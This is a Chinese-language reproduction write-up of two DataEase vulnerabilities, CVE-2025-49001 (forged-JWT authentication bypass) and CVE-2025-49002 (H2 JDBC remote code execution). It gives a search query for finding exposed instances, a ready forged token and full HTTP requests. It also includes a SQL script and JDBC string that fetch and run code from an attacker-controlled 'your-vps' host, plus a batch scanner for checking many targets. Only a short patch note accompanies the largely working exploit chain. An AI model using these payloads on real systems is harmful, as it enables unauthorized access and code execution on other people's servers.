漏洞介绍：

DataEase 是一款开源的数据分析平台，提供丰富的数据可视化和分析功能，帮助用户轻松地进行数据探索和决策支持，CVE-2025-49001 是由于JWT校验机制错误导致攻击者可伪造JWT令牌绕过身份验证流程，CVE-2025-49002 是由于H2数据库模块没有严格过滤用户输入的JDBC连接参数，可使用大小写绕过补丁。攻击者可利用这些漏洞实现未授权代码执行，威胁用户数据和系统的安全

影响版本：

DataEase <= 2.10.8



## Dataease JWT 认证绕过漏洞（CVE-2025-49001）

复现过程：

CVE-2025-49001中，由于JWT算法实现存在缺陷，导致攻击者可以使用任何密钥来伪造JWT令牌，从而绕过权限校验调用后台相关功能接口，从而则造成代码执行

fofa 搜索语句：title="DataEase"

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640.webp)

进入BP进行修改接口进行测试，数据包如下

```
GET /de2api/user/info HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Host: xx.x.xx.xx
out_auth_platform: default
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
```

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-1.webp)

成功复现

## Dataease H2数据库远程代码执行漏洞（CVE-2025-49002）

1. **H2数据库**：一个轻量级的Java SQL数据库，常作为嵌入式数据库使用
2. **JDBC连接参数**：用于建立数据库连接的配置参数，如URL、用户名、密码等

复现过程

CVE-2025-49002是由于H2数据库模块没有严格过滤用户输入的JDBC连接参数,可使用大小写绕过补丁。攻击者可利用这些漏洞实现未授权代码执行,在这里我们利用该漏洞修改连接参数使其连接到恶意服务器上后进行dns测试展示复现过程

这里使用Github进行下载并搭建，执行完安装命令后，访问地址即可来到应用页面，默认登录账号：admin/DataEase@123456，可以看到当前DataEase版本为2.6.1

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-2.webp)

准备两个文件，放在恶意服务下

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-3.webp)

evil.xml

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- 使用DNSLog外带信息 -->
    <bean class="java.net.InetAddress" factory-method="getByName">
            <constructor-arg value="http://dnslog"/>
    </bean>
</beans>
```

poc.sql

```
CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';

SET @url_str='http://your-vps/evil.xml';
SET @url_obj=UNESCAPE_VALUE(@url_str);
SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
SET @string_clazz=CLASS_FOR_NAME('java.lang.String');

CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);
```

使用 Python 启动一个简单的 HTTP 服务器：

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-4.webp)

现在进入BP改包进行测试

该漏洞的核心payload如下，我们使用它来攻击H2数据库

```
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://your-vps:2333/poc.sql' 
```

数据包如下

```
POST /de2api/datasource/validate HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
Accept-Language: zh-CN
Sec-Fetch-Dest: empty
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
sec-ch-ua-platform: "Windows"
Content-Type: application/json
Sec-Fetch-Mode: cors
Content-Length: 821

{
    "id": "",
    "name": "11",
    "description": "",
    "type": "h2",
    "apiConfiguration": [],
    "paramsConfiguration": [],
    "enableDataFill": false,
    "configuration": "eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0ZGI7VFJBQ0VfTEVWRUxfU1lTVEVNX09VVD0zO2luaXQ9UlVuU0NSSVBUIEZST00gJ2h0dHA6Ly95b3VyLXZwczoyMzMzL3BvYy5zcWwnIiwidXJsVHlwZSI6ImpkYmNVcmwiLCJzc2hUeXBlIjoicGFzc3dvcmQiLCJleHRyYVBhcmFtcyI6IiIsInVzZXJuYW1lIjoiMTIzIiwicGFzc3dvcmQiOiIxMjMiLCJob3N0IjoiIiwiYXV0aE1ldGhvZCI6IiIsInBvcnQiOjAsImluaXRpYWxQb29sU2l6ZSI6NSwibWluUG9vbFNpemUiOjUsIm1heFBvb2xTaXplIjo1LCJxdWVyeVRpbWVvdXQiOjMwfQ=="
}
```

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-5.webp)

这里小编虽然测试成功了，但是Vps没有显示连接，是个小遗憾，下来再找找问题，真正预期效果如下

Vps收到远程请求

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-6.webp)

执行xml中的外链dns

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-7.webp)



成功复现

修复意见：

更新至最新安全版本，目前官方已有可更新版本DataEase >= 2.10.10

官方补丁下载地址：

https://github.com/dataease/dataease/releases/tag/v2.10.10

介绍一个检测脚本

使用方法

```
批量检测：
python poc.py -f url.txt
单个检测：
python poc.py -u your-ip
import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import re
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    protocols = ['http://', 'https://']
    found_vulnerabilities = False

    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        print(f"Checking {target_url}")

        target_url.rstrip("/")
        target_url = urljoin(target_url, "/de2api/user/info")
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "X-DE-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8"
        }
        try:
            response = requests.get(target_url, verify=False, headers=headers)

            if response.status_code == 200 and all(key in response.text for key in('系统管理员','language','oid')):
                print(f"\033[31mFind:{url}:DataEase-CVE-2025-49001-JWTByPass!\033[0m")
                return True
        except Exception as e:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
```

检测实例

![图片](%E9%A3%9E%E8%87%B4%E4%BA%91%20DataEase%20Postgresql%20JDBC%20Bypass%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-49001%E3%80%81CVE-2025-49002.assets/640-1751419690960-8.webp)